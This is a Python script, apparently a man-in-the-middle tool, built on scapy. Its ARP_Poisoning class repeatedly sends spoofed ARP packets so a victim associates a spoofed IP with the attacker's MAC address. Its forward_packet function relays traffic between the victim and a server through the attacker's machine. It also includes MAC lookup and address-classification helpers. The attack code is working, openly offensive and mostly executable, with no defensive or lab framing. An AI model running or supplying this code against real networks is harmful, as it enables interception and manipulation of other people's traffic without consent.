import scapy.all as scapy
import time
import sys
import re
import ipaddress

class ARP_Poisoning:
    def __init__(self, iface, packet_interval, victim_mac, victim_ip, ip_to_spoof, attacker_mac, attacker_ip):
        self.iface = iface
        self.packet_interval = packet_interval
        self.victim_mac = victim_mac
        self.victim_ip = victim_ip
        self.ip_to_spoof = ip_to_spoof
        self.attacker_mac = attacker_mac
        self.attacker_ip = attacker_ip
    
    def run(self):
        try:
            while True:
                # sending spoofed ARP packet to the victim
                arp = scapy.Ether(src=self.attacker_mac) / scapy.ARP(psrc=self.ip_to_spoof, hwsrc=self.attacker_mac ,pdst=self.victim_ip, hwdst=self.victim_mac)
                scapy.sendp(arp, iface=self.iface)
                time.sleep(self.packet_interval)
        except KeyboardInterrupt:
            print("Stopping ARP poisoning")

def classify_address(address):
    """
    Classify a string as MAC address, IP address, or neither.
    
    Args:
        address (str): The address string to classify
    
    Returns:
        str: "MAC", "IP", or "ERROR"
    """
    if not isinstance(address, str):
        return "ERROR"

    
    # remove any whitespace
    address = address.strip()
    
    if not address:
        return "ERROR"
    
    # check for MAC address (colon-separated format only: XX:XX:XX:XX:XX:XX)
    mac_pattern = r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$'
    if re.match(mac_pattern, address):
        return "MAC"
    
    try:
        ipaddress.ip_address(address)
        return "IP"
    except (ValueError, AttributeError):
        pass
    
    # if neither MAC nor IP
    return "ERROR"

def get_mac_addr(ip):
    
    arp_req_pkt = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") / scapy.ARP(pdst=ip)
    answered, unanswered = scapy.srp(arp_req_pkt, timeout=1, verbose=False)

    if answered:
        return answered[0][1].hwsrc

    print("failed to get MAC address for IP:", ip)
    return None

def forward_packet(pkt, victim_ip, server_ip, victim_mac, server_mac, attacker_mac):
    
    if pkt.haslayer(scapy.IP):

        ip = pkt[scapy.IP]

        # if the packet is from the victim to the server
        if ip.src == victim_ip:

            # forward the packet to the server
            pkt[scapy.Ether].dst = server_mac
            pkt[scapy.Ether].src = attacker_mac
            scapy.sendp(pkt, verbose=False)

        # if the packet is from the server to the victim
        elif ip.src == server_ip:

            # forward the packet to the victim
            pkt[scapy.Ether].dst = victim_mac
            pkt[scapy.Ether].src = attacker_mac
            scapy.sendp(pkt, verbose=False)
    
    

    

    